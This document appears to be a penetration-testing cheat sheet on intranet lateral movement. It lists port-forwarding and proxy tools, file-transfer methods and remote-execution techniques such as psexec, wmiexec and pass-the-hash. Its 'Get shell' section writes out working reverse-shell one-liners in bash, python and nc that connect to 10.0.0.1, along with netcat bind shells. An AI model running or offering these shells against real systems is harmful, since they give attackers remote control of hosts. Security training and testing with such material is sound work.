Comprehensive skills
========================================

port forwarding
----------------------------------------
- windows
    - lcx
    - netsh
- linux
    - portmap
    - iptables
- socket proxy
    - Win: xsocks
    - Linux: proxychains
- http-based forwarding and socket proxy (penetration under low permissions)
    - Port forwarding: tunna
    - socks proxy: reGeorg
- ssh channel
    - Port forwarding
    - socks

Get shell
----------------------------------------
- Regular shell bounce

::

    bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f

- imcp_shell rebound that breaks through the firewall
- forward shell

::

    nc -e /bin/sh -lp 1234
    nc.exe -e cmd.exe -lp 1234

Intranet file transfer
----------------------------------------
- File transfer under windows
    - powershell
    - vbs script file
    - bitsadmin
    - File sharing
    - Use telnet to receive data
    - hta
- File transfer under linux
    - python
    - wget
    - tar + ssh
    - Use dns to transfer data
- File compilation
    - Powershell converts exe to txt, and then converts txt to exe

Remote connection && execution program
----------------------------------------
- at&schtasks
- psexec
- wmic
- wmiexec.vbs
- smbexec
- powershell remoting
- SC creates service execution
- schtasks
- SMB+MOF || DLL Hijacks
- PTH + compmgmt.msc
